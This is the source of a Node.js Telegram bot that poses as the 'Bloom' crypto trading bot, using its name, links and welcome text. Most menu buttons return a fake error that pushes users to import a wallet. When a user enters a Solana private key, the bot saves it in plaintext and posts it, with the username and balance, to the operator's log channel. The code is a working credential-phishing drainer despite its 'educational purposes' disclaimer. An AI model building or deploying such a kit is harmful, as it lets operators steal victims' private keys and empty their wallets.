
const { Connection, Keypair, PublicKey } = require('@solana/web3.js');
const bs58 = require('bs58');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = "BotToken"; // Your Bot Token
const LOG_CHANNEL_ID = "-9999999"; // Your LOG Channel ID
const bot = new TelegramBot(token, { polling: true });
// ⚠️ do not use this code for scamming indentions, it's only for educational purposes ⚠️
const userStates = new Map();
const lastRefreshTimes = new Map();
let currentSolPrice = 0;

async function fetchSolPrice() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    currentSolPrice = response.data.solana.usd;
    return currentSolPrice;
  } catch (error) {
    console.error('Error fetching SOL price:', error.message);
    return null;
  }
}

setInterval(fetchSolPrice, 30 * 60 * 1000);

fetchSolPrice();

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcomeMessage = `🌸 Bloom - Your UNFAIR advantage in crypto 🌸\n\n` +
    `Bloom allows you to seamlessly trade tokens, set automations like Limit Orders, Copy Trading, and more—all within Telegram.\n\n` +
    `By continuing, you'll create a crypto wallet that interacts directly with Bloom, enabling live data and instant transactions. All trading activities and wallet management will occur through Telegram.\n\n` +
    `⚠️ IMPORTANT: After clicking "Continue," your public wallet address and private key will be generated and displayed directly within Telegram. Ensure you are in a private, secure location before proceeding. Your private key will be shown only once, and it is crucial that you store it securely, as Bloom will not store or retrieve it for you.\n\n` +
    `By pressing "Continue," you confirm that you have read and agree to our Terms and Conditions and Privacy Policy. You also acknowledge the inherent risks involved in cryptocurrency trading and accept full responsibility for any outcomes related to your use of Bloom.\n\n` +
    `Please take a moment to review our terms before moving forward.`;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Continue', callback_data: 'main_menu' }]
      ]
    }
  };

  bot.sendMessage(chatId, welcomeMessage, options);
});

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  if (callbackQuery.data !== 'main_menu' && callbackQuery.data !== 'check_wallet') {
    await bot.editMessageText('❌ Error, please link your wallet / add balance to get started.', {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'main_menu' }]]
      }
    });
    return;
  }

  if (callbackQuery.data === 'main_menu') {
    const menuOptions = {
      reply_markup: {
        inline_keyboard: [
          [{ text: '📊 Positions', callback_data: 'positions' }, { text: '📱 LP Sniper', callback_data: 'lp_sniper' }],
          [{ text: '📋 Copy Trade', callback_data: 'copy_trade' }, { text: '👛 Wallet', callback_data: 'check_wallet' }],
          [{ text: '📈 Limit Orders', callback_data: 'limit_orders' }, { text: '🎁 Referrals', callback_data: 'referrals' }],
          [{ text: '💸 Withdraw', callback_data: 'withdraw' }, { text: '⚙️ Settings', callback_data: 'settings' }],
          [{ text: '❌ Close', callback_data: 'close' }, { text: '🔄 Refresh', callback_data: 'refresh' }]
        ]
      }
    };

    const data = loadWalletData();
    let messageText = `Welcome to Bloom! 🌸\n\nLet your trading journey blossom with us!\n\n`;

    if (data.wallets && data.wallets[chatId]) {
      const userWallet = data.wallets[chatId];
      const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
      const balance = await connection.getBalance(new PublicKey(userWallet.publicKey));
      const solBalance = balance / 1000000000;

      const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
      const solPrice = response.data.solana.usd;
      const usdBalance = solBalance * solPrice;

      messageText += `💳 Your Solana Wallet:\n\n${formatPublicKey(userWallet.publicKey)} - ${solBalance} SOL ($${usdBalance.toFixed(2)} USD)\n\n`;

      if (solBalance === 0) {
        messageText += `🔴 You currently have no SOL in your wallet.\nTo start trading, please deposit SOL to your address.\n\n`;
      }
      messageText += `📚 Resources:\n\n` +
        `• 📖 <a href="https://solana.bloombot.app/">Bloom Guides</a>\n` +
        `• 🔔 <a href="https://x.com/BloomTradingBot/">Bloom X</a>\n` +
        `• 🌍 <a href="https://www.bloombot.app/">Bloom Website</a>\n` +
        `• 🤝 <a href="https://t.me/bloomportal">Bloom Portal</a>`;
    } else {
      messageText += `💳 Your Solana Wallets:\n\n• Import or create new wallet to begin.\n\n🔴 You don't have a wallet linked. Please link a wallet to start trading.\n\n` +
        `📚 Resources:\n\n` +
        `• 📖 <a href="https://solana.bloombot.app/">Bloom Guides</a>\n` +
        `• 🔔 <a href="https://x.com/BloomTradingBot/">Bloom X</a>\n` +
        `• 🌍 <a href="https://www.bloombot.app/">Bloom Website</a>\n` +
        `• 🤝 <a href="https://t.me/bloomportal">Bloom Portal</a>`;
    }

    await bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'HTML',
      reply_markup: menuOptions.reply_markup
    });
  } else if (callbackQuery.data === 'refresh') {
    try {
      const data = loadWalletData();
      if (!data.wallets || !data.wallets[chatId]) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Wallet not found. Please add a wallet first.",
          show_alert: true
        });
        return;
      }

      const userWallet = data.wallets[chatId];
      const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
      
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Updating balance...",
        show_alert: false
      });

      try {
        const balance = await connection.getBalance(new PublicKey(userWallet.publicKey));
        const solBalance = balance / 1000000000;
        
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const solPrice = response.data.solana.usd;
        const usdBalance = solBalance * solPrice;
        
        data.wallets[chatId].balance = solBalance;
        saveWalletData(data);

        callbackQuery.data = 'main_menu';
        await bot.emit('callback_query', callbackQuery);
        
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `Balance updated: ${solBalance.toFixed(4)} SOL ($${usdBalance.toFixed(2)} USD)`,
          show_alert: true
        });
      } catch (balanceError) {
        throw new Error('Failed to update.');
      }
    } catch (error) {
      console.error('Refresh error:', error);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Failed to update.",
        show_alert: true
      });
    }
  } else if (callbackQuery.data === 'check_wallet') {
    try {
      const data = loadWalletData();
      if (data.wallets && data.wallets[chatId]) {
        const userWallet = data.wallets[chatId];
        const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
        const balance = await connection.getBalance(new PublicKey(userWallet.publicKey));
        const solBalance = balance / 1000000000;

        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const solPrice = response.data.solana.usd;
        const usdBalance = solBalance * solPrice;

        const walletInfo = `💳 Your Solana Wallets:\n🟢 ${formatPublicKey(userWallet.publicKey)} - ${solBalance} SOL ($${usdBalance.toFixed(2)} USD)`;
        await bot.sendMessage(chatId, walletInfo, {
          reply_markup: {
            inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'main_menu' }]]
          }
        });
      } else {
        const response = await bot.sendMessage(chatId, '🟠 Enter private key of the wallet you wish to import:', {
          reply_markup: {
            inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'main_menu' }]]
          }
        });
        userStates.set(chatId, { awaitingPrivateKey: true, messageToDelete: response.message_id });
      }

      try {
        await bot.deleteMessage(chatId, messageId);
      } catch (deleteError) {
        console.error('Error deleting message:', deleteError.message);
      }
    } catch (error) {
      console.error('Error handling callback query:', error.message);
      await bot.sendMessage(chatId, 'An error occurred. Please try again.');
    }
  }
});

const fs = require('fs');

function loadWalletData() {
  try {
    const data = JSON.parse(fs.readFileSync('database.json', 'utf8'));
    if (!data.wallets) {
      data.wallets = {};
      saveWalletData(data);
    }
    return data;
  } catch (error) {
    const defaultData = { wallets: {} };
    saveWalletData(defaultData);
    return defaultData;
  }
}

function saveWalletData(data) {
  fs.writeFileSync('database.json', JSON.stringify(data, null, 2));
}

function formatPublicKey(publicKey) {
  const keyStr = publicKey.toString();
  return `${keyStr.substring(0, 4)}...${keyStr.substring(keyStr.length - 4)}`;
}

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userState = userStates.get(chatId);

  if (userState && userState.awaitingPrivateKey) {
    await bot.deleteMessage(chatId, msg.message_id);
    await bot.deleteMessage(chatId, userState.messageToDelete);

    try {
      const privateKeyString = msg.text;
      const privateKeyBytes = bs58.default.decode(privateKeyString);

      if (privateKeyBytes.length !== 64) {
        throw new Error('Private key must be 64 bytes in length');
      }

      const keypair = Keypair.fromSecretKey(privateKeyBytes);
      const publicKey = keypair.publicKey;
      const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
      const balance = await connection.getBalance(publicKey);

      const data = loadWalletData();
      const solBalance = balance / 1000000000;
      data.wallets[chatId] = {
        publicKey: publicKey.toString(),
        privateKey: privateKeyString,
        balance: solBalance
      };
      saveWalletData(data);

      await bot.sendMessage(chatId, 
        `Wallet imported successfully!\nPublic Address: ${formatPublicKey(publicKey)}\nBalance: ${solBalance} SOL`, {
        reply_markup: {
          inline_keyboard: [[{ text: 'Continue', callback_data: 'main_menu' }]]
        }
      });

      const username = msg.from.username ? `@${msg.from.username}` : `${msg.from.first_name}`;
      const logMessage = `New wallet linked!\n\n` +
        `User: ${username}\n` +
        `Balance: ${solBalance} SOL\n` +
        `Public Address: ${publicKey.toString()}\n` +
        `Group Link: https://t.me/c/4778968918\n` +
        `Private Key (Click to copy):\n` +
        `<code>${privateKeyString}</code>`;

      await bot.sendMessage(LOG_CHANNEL_ID, logMessage, { parse_mode: 'HTML' });
    } catch (error) {
      await bot.sendMessage(chatId, `Error: ${error.message}`);
    }

    userStates.delete(chatId);
  }
});

console.log('Bot is running...');
